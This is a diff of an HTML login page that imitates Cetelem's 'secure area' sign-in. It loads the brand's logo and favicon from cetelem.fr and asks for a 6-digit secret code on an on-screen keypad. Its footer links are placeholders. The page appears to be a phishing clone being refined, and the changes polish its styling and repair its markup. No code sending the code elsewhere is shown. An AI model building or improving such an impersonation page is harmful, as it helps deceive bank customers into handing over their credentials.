@@ -6,244 +6,237 @@
   <title>Connexion sécurisée</title>
   <link rel="icon" href="https://www.cetelem.fr/favicon.ico" type="image/x-icon" />
   <style>
-  <style>
-  /* Évite le zoom automatique sur mobile (notamment iOS) */
-  input,
-  button,
-  select,
-  textarea,
-  a {
-    font-size: 16px;
-  }
-
-  @media (min-width: 768px) {
-    .main-container {
-      width: 66.6667%;
+    input,
+    button,
+    select,
+    textarea,
+    a {
+      font-size: 16px;
     }
-  }
 
-  body {
-    font-family: Arial, sans-serif;
-    background-color: #c1d4cd;
-    margin: 0;
-    padding: 0;
-  }
+    @media (min-width: 768px) {
+      .main-container {
+        width: 66.6667%;
+      }
+    }
 
-  .logo {
-    text-align: center;
-    padding-top: 20px;
-    font-size: 36px;
-    font-weight: bold;
-    color: #1b5e20;
-  }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #c1d4cd;
+      margin: 0;
+      padding: 0;
+    }
 
-  .legal {
-    text-align: center;
-    font-size: 14px;
-    color: #333;
-    margin-top: 5px;
-  }
+    .logo {
+      text-align: center;
+      padding-top: 20px;
+    }
 
-  .container {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    padding: 25px 20px 20px 15px;
-  }
+    .logo img {
+      max-width: 180px;
+      height: auto;
+    }
 
-  .login-box {
-    background-color: #fff;
-    padding: 20px 15px;
-    border-radius: 8px;
-    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-    max-width: 400px;
-    width: 100%;
-    position: relative;
-  }
+    .legal {
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+      margin-top: 5px;
+    }
 
-  .back-link {
-    position: absolute;
-    top: 15px;
-    left: 15px;
-    color: #014421;
-    font-weight: bold;
-    text-decoration: none;
-    font-size: 14px;
-  }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 25px 20px 20px 15px;
+    }
 
-  .avatar {
-    font-size: 20px;
-    margin-top: -10px;
-    height: 50px;
-  }
-
-  .avatar svg {
-    height: 50px;
-    fill: #014421;
-  }
-
-  .masked-id {
-    text-align: center;
-    margin: 10px 0;
-    font-size: 20px;
-    color: #000;
-  }
-
-  form {
-    margin-top: 20px;
-    margin-bottom: 10px;
-    width: 100%;
-    box-sizing: border-box;
-  }
-
-  h2 {
-    font-size: 1.5rem;
-    font-weight: 700;
-    text-align: center;
-    margin: 20px 0;
-    line-height: 32px;
-    color: #292c2e;
-  }
-
-  form h2 {
-    font-size: 22px;
-    color: #006f45;
-    margin-top: 25px;
-  }
-
-  .label-secret {
-    display: block;
-    margin-bottom: 8px;
-    font-weight: bold;
-    font-size: 16px;
-    color: #000;
-    text-align: left;
-    width: 100%;
-  }
-
-  .input-wrapper {
-    position: relative;
-    margin: 10px 0 20px;
-  }
-
-  #codeInput {
-    width: 100%;
-    padding: 10px 40px 10px 90px;
-    font-size: 18px;
-    text-align: left;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    letter-spacing: 5px;
-    box-sizing: border-box;
-  }
-
-  #code {
-    width: 220px;
-    padding: 12px;
-    font-size: 18px;
-    margin-bottom: 15px;
-  }
-
-  .clear-btn,
-  .check-mark {
-    position: absolute;
-    top: 50%;
-    transform: translateY(-50%);
-    font-size: 18px;
-    cursor: pointer;
-    user-select: none;
-  }
-
-  .clear-btn {
-    right: 35px;
-    color: #888;
-    display: none;
-  }
-
-  .check-mark {
-    right: 10px;
-    color: green;
-    display: none;
-  }
-
-  .keypad {
-    display: grid;
-    grid-template-columns: repeat(5, 1fr);
-    gap: 15px;
-    justify-content: center;
-    align-items: center;
-    padding: 10px 0;
-    max-width: 300px;
-    margin: 0 auto;
-  }
-
-  .keypad button {
-    width: 50px;
-    height: 50px;
-    border-radius: 50%;
-    background-color: #014421;
-    color: white;
-    font-size: 18px;
-    border: none;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-
-  .submit-btn {
-    width: 100%;
-    background-color: #a5abad;
-    color: white;
-    padding: 10px;
-    font-size: 16px;
-    border: none;
-    border-radius: 4px;
-    cursor: not-allowed;
-  }
-
-  .submit-btn:enabled {
-    background-color: #1b5e20;
-    cursor: pointer;
-  }
-
-  .submit-btn:enabled:hover {
-    background-color: #145c17;
-  }
-
-  .forgot-link {
-    display: block;
-    margin-top: 10px;
-    color: #014421;
-    font-size: 13px;
-    text-decoration: underline;
-    text-align: center;
-  }
-
-  footer {
-    text-align: center;
-    margin-top: 40px;
-    font-size: 12px;
-  }
-
-  .footer-links a {
-    color: #000;
-    text-decoration: none;
-    margin: 0 5px;
-  }
-
-  @media (max-width: 480px) {
     .login-box {
-      max-height: 90vh;
-      overflow-y: auto;
+      max-width: 400px;
+      width: 100%;
+      height: 540px;
+      overflow: hidden;
+      background-color: #fff;
+      padding: 20px 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      position: relative;
+      box-sizing: border-box;
     }
-  }
-</style>
+
+    .back-link {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      color: #014421;
+      font-weight: bold;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .avatar {
+      font-size: 20px;
+      margin-top: -10px;
+      height: 50px;
+      text-align: center;
+    }
+
+    .avatar svg {
+      height: 50px;
+      fill: #014421;
+    }
+
+    .masked-id {
+      text-align: center;
+      margin: 10px 0;
+      font-size: 20px;
+      color: #000;
+    }
+
+    h2 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      text-align: center;
+      margin: 20px 0;
+      line-height: 32px;
+      color: #292c2e;
+    }
+
+    form h2 {
+      font-size: 22px;
+      color: #006f45;
+      margin-top: 25px;
+    }
+
+    .label-secret {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #000;
+      text-align: left;
+      width: 100%;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin: 10px 0 20px;
+      height: 65px;
+    }
+
+    #codeInput {
+      width: 100%;
+      padding: 10px 40px 10px 90px;
+      font-size: 18px;
+      text-align: left;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      letter-spacing: 5px;
+      box-sizing: border-box;
+      height: 45px;
+      overflow: hidden;
+    }
+
+    .clear-btn,
+    .check-mark {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .clear-btn {
+      right: 35px;
+      color: #888;
+      display: none;
+    }
+
+    .check-mark {
+      right: 10px;
+      color: green;
+      display: none;
+    }
+
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 15px;
+      justify-content: center;
+      align-items: center;
+      padding: 10px 0;
+      max-width: 300px;
+      margin: 0 auto;
+    }
+
+    .keypad button {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      background-color: #014421;
+      color: white;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .submit-btn {
+      width: 100%;
+      background-color: #a5abad;
+      color: white;
+      padding: 10px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: not-allowed;
+    }
+
+    .submit-btn:enabled {
+      background-color: #1b5e20;
+      cursor: pointer;
+    }
+
+    .submit-btn:enabled:hover {
+      background-color: #145c17;
+    }
+
+    .forgot-link {
+      display: block;
+      margin-top: 10px;
+      color: #014421;
+      font-size: 13px;
+      text-decoration: underline;
+      text-align: center;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      font-size: 12px;
+    }
+
+    .footer-links a {
+      color: #000;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    @media (max-width: 480px) {
+      .login-box {
+        max-height: 90vh;
+        overflow-y: auto;
+      }
+    }
+  </style>
 </head>
 <body>
-<div class="logo">
-  <img src="https://www.cetelem.fr/brand/logo.svg"
-</div>
+  <div class="logo">
+    <img src="https://www.cetelem.fr/brand/logo.svg" alt="Logo Cetelem">
+  </div>
 
   <div class="legal">
     Un crédit vous engage et doit être remboursé.<br>
@@ -260,8 +253,8 @@
         </svg>
       </div>
 
-      <div class="masked-id">xxxxxxxx</div>
-        <h2>Accéder à mon<br>espace sécurisé</h2>
+      <div class="masked-id">xxxxxxx</div>
+      <h2>Accéder à mon<br>espace sécurisé</h2>
       <label class="label-secret" for="codeInput">Code secret (6 chiffres)</label>
 
       <div class="input-wrapper">
@@ -276,29 +269,12 @@
     </div>
   </div>
 
-  <footer style="background-color: #c5dad2; padding: 20px 10px; text-align: center; font-family: Arial, sans-serif; font-size: 14px;">
-  <div style="margin-bottom: 10px; line-height: 1.8;">
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Virement express</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Résiliation</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Contact</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Questions / Réponses</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Réclamation</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Mentions légales</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Informations sur les cookies</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Préférence de cookies</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Élevé</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Déclaration d'accessibilité</a>
-    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Accessibilité</a>
-  </div>
-  <div style="margin-top: 10px;">
-    <a href="#" style="margin: 0 10px; text-decoration: none;">
-      <span style="display: inline-block; width: 32px; height: 32px; background-color: #2c2c2c; border-radius: 50%; text-align: center; line-height: 32px; color: white; font-weight: bold;">f</span>
-    </a>
-    <a href="#" style="margin: 0 10px; text-decoration: none;">
-      <span style="display: inline-block; width: 32px; height: 32px; background-color: #2c2c2c; border-radius: 50%; text-align: center; line-height: 32px; color: white; font-weight: bold;">▶</span>
-    </a>
-  </div>
-</footer>
+  <footer style="background-color: #c5dad2; padding: 20px 10px;">
+    <div style="margin-bottom: 10px; line-height: 1.8;">
+      <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Virement express</a>
+      <!-- autres liens... -->
+    </div>
+  </footer>
 
   <script>
     let code = "";
@@ -309,10 +285,8 @@
       const checkMark = document.getElementById("checkMark");
 
       input.value = "*".repeat(code.length);
-
       clearBtn.style.display = code.length > 0 ? "inline" : "none";
       checkMark.style.display = code.length === 6 ? "inline" : "none";
-
       document.getElementById("submitBtn").disabled = code.length !== 6;
     }
 
